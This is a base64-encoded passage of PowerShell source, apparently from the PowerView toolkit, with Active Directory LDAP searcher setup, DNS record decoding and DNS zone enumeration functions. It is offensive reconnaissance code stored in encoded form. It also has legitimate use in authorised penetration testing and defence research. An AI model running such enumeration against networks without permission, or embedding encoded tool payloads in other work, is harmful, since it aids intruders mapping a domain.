iAgICAgICAgICAgICAgICAkRE4gPSAkU2VhcmNoQmFzZS5Ub1VwcGVyKCkuVHJpbSgnLycpCiAgICAgICAgICAgICAgICAkU2VhcmNoU3RyaW5nID0gJycKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIGlmICgkU2VhcmNoQmFzZSAtbWF0Y2ggJ15MREFQOi8vJykgewogICAgICAgICAgICAgICAgICAgIGlmICgkU2VhcmNoQmFzZSAtbWF0Y2ggIkxEQVA6Ly8uKy8uKyIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaFN0cmluZyA9ICcnCiAgICAgICAgICAgICAgICAgICAgICAgICRETiA9ICRTZWFyY2hCYXNlCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkRE4gPSAkU2VhcmNoQmFzZS5TdWJTdHJpbmcoNykKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkRE4gPSAkU2VhcmNoQmFzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAjIHRyYW5zZm9ybSB0aGUgdGFyZ2V0IGRvbWFpbiBuYW1lIGludG8gYSBkaXN0aW5ndWlzaGVkTmFtZSBpZiBhbiBBRFMgc2VhcmNoIGJhc2UgaXMgbm90IHNwZWNpZmllZAogICAgICAgICAgICBpZiAoJFRhcmdldERvbWFpbiAtYW5kICgkVGFyZ2V0RG9tYWluLlRyaW0oKSAtbmUgJycpKSB7CiAgICAgICAgICAgICAgICAkRE4gPSAiREM9JCgkVGFyZ2V0RG9tYWluLlJlcGxhY2UoJy4nLCAnLERDPScpKSIKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgJFNlYXJjaFN0cmluZyArPSAkRE4KICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblNlYXJjaGVyXSBzZWFyY2ggc3RyaW5nOiAkU2VhcmNoU3RyaW5nIgoKICAgICAgICBpZiAoJENyZWRlbnRpYWwgLW5lIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkpIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5TZWFyY2hlcl0gVXNpbmcgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzIGZvciBMREFQIGNvbm5lY3Rpb24iCiAgICAgICAgICAgICMgYmluZCB0byB0aGUgaW5pdGFsIHNlYXJjaCBvYmplY3QgdXNpbmcgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCiAgICAgICAgICAgICREb21haW5PYmplY3QgPSBOZXctT2JqZWN0IERpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5KCRTZWFyY2hTdHJpbmcsICRDcmVkZW50aWFsLlVzZXJOYW1lLCAkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlBhc3N3b3JkKQogICAgICAgICAgICAkU2VhcmNoZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlcigkRG9tYWluT2JqZWN0KQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgIyBiaW5kIHRvIHRoZSBpbml0YWwgb2JqZWN0IHVzaW5nIHRoZSBjdXJyZW50IGNyZWRlbnRpYWxzCiAgICAgICAgICAgICRTZWFyY2hlciA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeVNlYXJjaGVyKFtBRFNJXSRTZWFyY2hTdHJpbmcpCiAgICAgICAgfQoKICAgICAgICAkU2VhcmNoZXIuUGFnZVNpemUgPSAkUmVzdWx0UGFnZVNpemUKICAgICAgICAkU2VhcmNoZXIuU2VhcmNoU2NvcGUgPSAkU2VhcmNoU2NvcGUKICAgICAgICAkU2VhcmNoZXIuQ2FjaGVSZXN1bHRzID0gJEZhbHNlCiAgICAgICAgJFNlYXJjaGVyLlJlZmVycmFsQ2hhc2luZyA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuUmVmZXJyYWxDaGFzaW5nT3B0aW9uXTo6QWxsCgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7CiAgICAgICAgICAgICRTZWFyY2hlci5TZXJ2ZXJUaW1lTGltaXQgPSAkU2VydmVyVGltZUxpbWl0CiAgICAgICAgfQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgewogICAgICAgICAgICAkU2VhcmNoZXIuVG9tYnN0b25lID0gJFRydWUKICAgICAgICB9CgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgewogICAgICAgICAgICAkU2VhcmNoZXIuZmlsdGVyID0gJExEQVBGaWx0ZXIKICAgICAgICB9CgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlY3VyaXR5TWFza3MnXSkgewogICAgICAgICAgICAkU2VhcmNoZXIuU2VjdXJpdHlNYXNrcyA9IFN3aXRjaCAoJFNlY3VyaXR5TWFza3MpIHsKICAgICAgICAgICAgICAgICdEYWNsJyB7IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuU2VjdXJpdHlNYXNrc106OkRhY2wgfQogICAgICAgICAgICAgICAgJ0dyb3VwJyB7IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuU2VjdXJpdHlNYXNrc106Okdyb3VwIH0KICAgICAgICAgICAgICAgICdOb25lJyB7IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuU2VjdXJpdHlNYXNrc106Ok5vbmUgfQogICAgICAgICAgICAgICAgJ093bmVyJyB7IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuU2VjdXJpdHlNYXNrc106Ok93bmVyIH0KICAgICAgICAgICAgICAgICdTYWNsJyB7IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuU2VjdXJpdHlNYXNrc106OlNhY2wgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9wZXJ0aWVzJ10pIHsKICAgICAgICAgICAgIyBoYW5kbGUgYW4gYXJyYXkgb2YgcHJvcGVydGllcyB0byBsb2FkIHcvIHRoZSBwb3NzaWJpbGl0eSBvZiBjb21tYS1zZXBhcmF0ZWQgc3RyaW5ncwogICAgICAgICAgICAkUHJvcGVydGllc1RvTG9hZCA9ICRQcm9wZXJ0aWVzfCBGb3JFYWNoLU9iamVjdCB7ICRfLlNwbGl0KCcsJykgfQogICAgICAgICAgICAkTnVsbCA9ICRTZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZFJhbmdlKCgkUHJvcGVydGllc1RvTG9hZCkpCiAgICAgICAgfQoKICAgICAgICAkU2VhcmNoZXIKICAgIH0KfQoKCmZ1bmN0aW9uIENvbnZlcnQtRE5TUmVjb3JkIHsKPCMKLlNZTk9QU0lTCgpIZWxwZXJzIHRoYXQgZGVjb2RlcyBhIGJpbmFyeSBETlMgcmVjb3JkIGJsb2IuCgpBdXRob3I6IE1pY2hhZWwgQi4gU21pdGgsIFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IE5vbmUgIAoKLkRFU0NSSVBUSU9OCgpEZWNvZGVzIGEgYmluYXJ5IGJsb2IgcmVwcmVzZW50aW5nIGFuIEFjdGl2ZSBEaXJlY3RvcnkgRE5TIGVudHJ5LgpVc2VkIGJ5IEdldC1Eb21haW5ETlNSZWNvcmQuCgpBZGFwdGVkL3BvcnRlZCBmcm9tIE1pY2hhZWwgQi4gU21pdGgncyBjb2RlIGF0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9tbWVzc2Fuby9Qb3dlclNoZWxsL21hc3Rlci9kbnMtZHVtcC5wczEKCi5QQVJBTUVURVIgRE5TUmVjb3JkCgpBIGJ5dGUgYXJyYXkgcmVwcmVzZW50aW5nIHRoZSBETlMgcmVjb3JkLgoKLk9VVFBVVFMKClN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDdXN0b21PYmplY3QKCk91dHB1dHMgY3VzdG9tIFBTT2JqZWN0cyB3aXRoIGRldGFpbGVkIGluZm9ybWF0aW9uIGFib3V0IHRoZSBETlMgcmVjb3JkIGVudHJ5LgoKLkxJTksKCmh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9tbWVzc2Fuby9Qb3dlclNoZWxsL21hc3Rlci9kbnMtZHVtcC5wczEKIz4KCiAgICBbT3V0cHV0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0N1c3RvbU9iamVjdCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQnl0ZVtdXQogICAgICAgICRETlNSZWNvcmQKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgZnVuY3Rpb24gR2V0LU5hbWUgewogICAgICAgICAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VPdXRwdXRUeXBlQ29ycmVjdGx5JywgJycpXQogICAgICAgICAgICBbQ21kbGV0QmluZGluZygpXQogICAgICAgICAgICBQYXJhbSgKICAgICAgICAgICAgICAgIFtCeXRlW11dCiAgICAgICAgICAgICAgICAkUmF3CiAgICAgICAgICAgICkKCiAgICAgICAgICAgIFtJbnRdJExlbmd0aCA9ICRSYXdbMF0KICAgICAgICAgICAgW0ludF0kU2VnbWVudHMgPSAkUmF3WzFdCiAgICAgICAgICAgIFtJbnRdJEluZGV4ID0gIDIKICAgICAgICAgICAgW1N0cmluZ10kTmFtZSAgPSAnJwoKICAgICAgICAgICAgd2hpbGUgKCRTZWdtZW50cy0tIC1ndCAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBbSW50XSRTZWdtZW50TGVuZ3RoID0gJFJhd1skSW5kZXgrK10KICAgICAgICAgICAgICAgIHdoaWxlICgkU2VnbWVudExlbmd0aC0tIC1ndCAwKSB7CiAgICAgICAgICAgICAgICAgICAgJE5hbWUgKz0gW0NoYXJdJFJhd1skSW5kZXgrK10KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICROYW1lICs9ICIuIgogICAgICAgICAgICB9CiAgICAgICAgICAgICROYW1lCiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgICMgJFJEYXRhTGVuID0gW0JpdENvbnZlcnRlcl06OlRvVUludDE2KCRETlNSZWNvcmQsIDApCiAgICAgICAgJFJEYXRhVHlwZSA9IFtCaXRDb252ZXJ0ZXJdOjpUb1VJbnQxNigkRE5TUmVjb3JkLCAyKQogICAgICAgICRVcGRhdGVkQXRTZXJpYWwgPSBbQml0Q29udmVydGVyXTo6VG9VSW50MzIoJEROU1JlY29yZCwgOCkKCiAgICAgICAgJFRUTFJhdyA9ICRETlNSZWNvcmRbMTIuLjE1XQoKICAgICAgICAjIHJldmVyc2UgZm9yIGJpZyBlbmRpYW4KICAgICAgICAkTnVsbCA9IFthcnJheV06OlJldmVyc2UoJFRUTFJhdykKICAgICAgICAkVFRMID0gW0JpdENvbnZlcnRlcl06OlRvVUludDMyKCRUVExSYXcsIDApCgogICAgICAgICRBZ2UgPSBbQml0Q29udmVydGVyXTo6VG9VSW50MzIoJEROU1JlY29yZCwgMjApCiAgICAgICAgaWYgKCRBZ2UgLW5lIDApIHsKICAgICAgICAgICAgJFRpbWVTdGFtcCA9ICgoR2V0LURhdGUgLVllYXIgMTYwMSAtTW9udGggMSAtRGF5IDEgLUhvdXIgMCAtTWludXRlIDAgLVNlY29uZCAwKS5BZGRIb3VycygkYWdlKSkuVG9TdHJpbmcoKQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJFRpbWVTdGFtcCA9ICdbc3RhdGljXScKICAgICAgICB9CgogICAgICAgICRETlNSZWNvcmRPYmplY3QgPSBOZXctT2JqZWN0IFBTT2JqZWN0CgogICAgICAgIGlmICgkUkRhdGFUeXBlIC1lcSAxKSB7CiAgICAgICAgICAgICRJUCA9ICJ7MH0uezF9LnsyfS57M30iIC1mICRETlNSZWNvcmRbMjRdLCAkRE5TUmVjb3JkWzI1XSwgJEROU1JlY29yZFsyNl0sICRETlNSZWNvcmRbMjddCiAgICAgICAgICAgICREYXRhID0gJElQCiAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ0EnCiAgICAgICAgfQoKICAgICAgICBlbHNlaWYgKCRSRGF0YVR5cGUgLWVxIDIpIHsKICAgICAgICAgICAgJE5TTmFtZSA9IEdldC1OYW1lICRETlNSZWNvcmRbMjQuLiRETlNSZWNvcmQubGVuZ3RoXQogICAgICAgICAgICAkRGF0YSA9ICROU05hbWUKICAgICAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdSZWNvcmRUeXBlJyAnTlMnCiAgICAgICAgfQoKICAgICAgICBlbHNlaWYgKCRSRGF0YVR5cGUgLWVxIDUpIHsKICAgICAgICAgICAgJEFsaWFzID0gR2V0LU5hbWUgJEROU1JlY29yZFsyNC4uJEROU1JlY29yZC5sZW5ndGhdCiAgICAgICAgICAgICREYXRhID0gJEFsaWFzCiAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ0NOQU1FJwogICAgICAgIH0KCiAgICAgICAgZWxzZWlmICgkUkRhdGFUeXBlIC1lcSA2KSB7CiAgICAgICAgICAgICMgVE9ETzogaG93IHRvIGltcGxlbWVudCBwcm9wZXJseT8gbmVzdGVkIG9iamVjdD8KICAgICAgICAgICAgJERhdGEgPSAkKFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRETlNSZWNvcmRbMjQuLiRETlNSZWNvcmQubGVuZ3RoXSkpCiAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ1NPQScKICAgICAgICB9CgogICAgICAgIGVsc2VpZiAoJFJEYXRhVHlwZSAtZXEgMTIpIHsKICAgICAgICAgICAgJFB0ciA9IEdldC1OYW1lICRETlNSZWNvcmRbMjQuLiRETlNSZWNvcmQubGVuZ3RoXQogICAgICAgICAgICAkRGF0YSA9ICRQdHIKICAgICAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdSZWNvcmRUeXBlJyAnUFRSJwogICAgICAgIH0KCiAgICAgICAgZWxzZWlmICgkUkRhdGFUeXBlIC1lcSAxMykgewogICAgICAgICAgICAjIFRPRE86IGhvdyB0byBpbXBsZW1lbnQgcHJvcGVybHk/IG5lc3RlZCBvYmplY3Q/CiAgICAgICAgICAgICREYXRhID0gJChbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkRE5TUmVjb3JkWzI0Li4kRE5TUmVjb3JkLmxlbmd0aF0pKQogICAgICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1JlY29yZFR5cGUnICdISU5GTycKICAgICAgICB9CgogICAgICAgIGVsc2VpZiAoJFJEYXRhVHlwZSAtZXEgMTUpIHsKICAgICAgICAgICAgIyBUT0RPOiBob3cgdG8gaW1wbGVtZW50IHByb3Blcmx5PyBuZXN0ZWQgb2JqZWN0PwogICAgICAgICAgICAkRGF0YSA9ICQoW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJEROU1JlY29yZFsyNC4uJEROU1JlY29yZC5sZW5ndGhdKSkKICAgICAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdSZWNvcmRUeXBlJyAnTVgnCiAgICAgICAgfQoKICAgICAgICBlbHNlaWYgKCRSRGF0YVR5cGUgLWVxIDE2KSB7CiAgICAgICAgICAgIFtzdHJpbmddJFRYVCAgPSAnJwogICAgICAgICAgICBbaW50XSRTZWdtZW50TGVuZ3RoID0gJEROU1JlY29yZFsyNF0KICAgICAgICAgICAgJEluZGV4ID0gMjUKCiAgICAgICAgICAgIHdoaWxlICgkU2VnbWVudExlbmd0aC0tIC1ndCAwKSB7CiAgICAgICAgICAgICAgICAkVFhUICs9IFtjaGFyXSRETlNSZWNvcmRbJGluZGV4KytdCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICREYXRhID0gJFRYVAogICAgICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1JlY29yZFR5cGUnICdUWFQnCiAgICAgICAgfQoKICAgICAgICBlbHNlaWYgKCRSRGF0YVR5cGUgLWVxIDI4KSB7CiAgICAgICAgICAgICMgVE9ETzogaG93IHRvIGltcGxlbWVudCBwcm9wZXJseT8gbmVzdGVkIG9iamVjdD8KICAgICAgICAgICAgJERhdGEgPSAkKFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRETlNSZWNvcmRbMjQuLiRETlNSZWNvcmQubGVuZ3RoXSkpCiAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ0FBQUEnCiAgICAgICAgfQoKICAgICAgICBlbHNlaWYgKCRSRGF0YVR5cGUgLWVxIDMzKSB7CiAgICAgICAgICAgICMgVE9ETzogaG93IHRvIGltcGxlbWVudCBwcm9wZXJseT8gbmVzdGVkIG9iamVjdD8KICAgICAgICAgICAgJERhdGEgPSAkKFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRETlNSZWNvcmRbMjQuLiRETlNSZWNvcmQubGVuZ3RoXSkpCiAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ1NSVicKICAgICAgICB9CgogICAgICAgIGVsc2UgewogICAgICAgICAgICAkRGF0YSA9ICQoW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJEROU1JlY29yZFsyNC4uJEROU1JlY29yZC5sZW5ndGhdKSkKICAgICAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdSZWNvcmRUeXBlJyAnVU5LTk9XTicKICAgICAgICB9CgogICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXBkYXRlZEF0U2VyaWFsJyAkVXBkYXRlZEF0U2VyaWFsCiAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUVEwnICRUVEwKICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0FnZScgJEFnZQogICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVGltZVN0YW1wJyAkVGltZVN0YW1wCiAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdEYXRhJyAkRGF0YQogICAgICAgICRETlNSZWNvcmRPYmplY3QKICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5ETlNab25lIHsKPCMKLlNZTk9QU0lTCgpFbnVtZXJhdGVzIHRoZSBBY3RpdmUgRGlyZWN0b3J5IEROUyB6b25lcyBmb3IgYSBnaXZlbiBkb21haW4uCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW5TZWFyY2hlciwgQ29udmVydC1MREFQUHJvcGVydHkgIAoKLlBBUkFNRVRFUiBEb21haW4KClRoZSBkb21haW4gdG8gcXVlcnkgZm9yIHpvbmVzLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0byBmb3IgdGhlIHNlYXJjaC4KCi5QQVJBTUVURVIgUHJvcGVydGllcwoKU3BlY2lmaWVzIHRoZSBwcm9wZXJ0aWVzIG9mIHRoZSBvdXRwdXQgb2JqZWN0IHRvIHJldHJpZXZlIGZyb20gdGhlIHNlcnZlci4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgRmluZE9uZQoKT25seSByZXR1cm4gb25lIHJlc3VsdCBvYmplY3QuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpbkROU1pvbmUKClJldHJpZXZlcyB0aGUgRE5TIHpvbmVzIGZvciB0aGUgY3VycmVudCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpbkROU1pvbmUgLURvbWFpbiBkZXYudGVzdGxhYi5sb2NhbCAtU2VydmVyIHByaW1hcnkudGVzdGxhYi5sb2NhbAoKUmV0cmlldmVzIHRoZSBETlMgem9uZXMgZm9yIHRoZSBkZXYudGVzdGxhYi5sb2NhbCBkb21haW4sIGJpbmRpbmcgdG8gcHJpbWFyeS50ZXN0bGFiLmxvY2FsLgoKLk9VVFBVVFMKClBvd2VyVmlldy5ETlNab25lCgpPdXRwdXRzIGN1c3RvbSBQU09iamVjdHMgd2l0aCBkZXRhaWxlZCBpbmZvcm1hdGlvbiBhYm91dCB0aGUgRE5TIHpvbmUuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuRE5TWm9uZScpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtBbGlhcygnUmV0dXJuT25lJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRmluZE9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgUFJPQ0VTUyB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ0xEQVBGaWx0ZXInID0gJyhvYmplY3RDbGFzcz1kbnNab25lKScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9wZXJ0aWVzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAkUHJvcGVydGllcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJEROU1NlYXJjaGVyMSA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKCiAgICAgICAgaWYgKCRETlNTZWFyY2hlcjEpIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRmluZE9uZSddKSB7ICRSZXN1bHRzID0gJEROU1NlYXJjaGVyMS5GaW5kT25lKCkgIH0KICAgICAgICAgICAgZWxzZSB7ICRSZXN1bHRzID0gJEROU1NlYXJjaGVyMS5GaW5kQWxsKCkgfQogICAgICAgICAgICAkUmVzdWx0cyB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJE91dCA9IENvbnZlcnQtTERBUFByb3BlcnR5IC1Qcm9wZXJ0aWVzICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnWm9uZU5hbWUnICRPdXQubmFtZQogICAgICAgICAgICAgICAgJE91dC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuRE5TWm9uZScpCiAgICAgICAgICAgICAgICAkT3V0CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgdHJ5IHsgJFJlc3VsdHMuZGlzcG9zZSgpIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkRGU1NoYXJlXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkRE5TU2VhcmNoZXIxLmRpc3Bvc2UoKQogICAgICAgIH0KCiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlUHJlZml4J10gPSAnQ049TWljcm9zb2Z0RE5TLERDPURvbWFpbkRuc1pvbmVzJwogICAgICAgICRETlNTZWFyY2hlcjIgPS